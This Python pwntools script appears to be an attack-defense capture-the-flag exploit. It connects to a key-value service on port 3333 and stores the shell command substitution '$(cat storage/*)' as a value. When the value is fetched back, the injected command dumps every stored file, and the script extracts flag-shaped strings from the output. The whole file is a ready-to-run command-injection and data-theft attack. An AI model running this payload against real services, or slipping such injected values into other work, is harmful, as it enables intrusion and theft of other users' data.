#!/usr/bin/env python

import sys
from pwn import *
import string
import random
import re

PORT = 3333


def generate_string(len = 16, alph = string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join([random.choice(alph) for _ in range(len)])


def main(ip):
    key = generate_string()
    
    r = remote(ip, PORT)
    r.recvuntil("?\n")
    r.sendline("put")
    r.recvuntil("?\n")
    r.sendline(key)
    r.recvuntil("?\n")
    r.sendline("$(cat storage/*)")
    r.close()

    r = remote(ip, PORT)
    r.recvuntil("?\n")
    r.sendline("get")
    r.recvuntil("?\n")
    r.sendline(key)
    data = r.recvall()
    r.close()
    
    print("\n".join(re.findall("[0-9A-Z]{31}=", data)))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: ./nsychev_buggy_put.py ip")
        
    ip = sys.argv[1]
    
    main(ip)
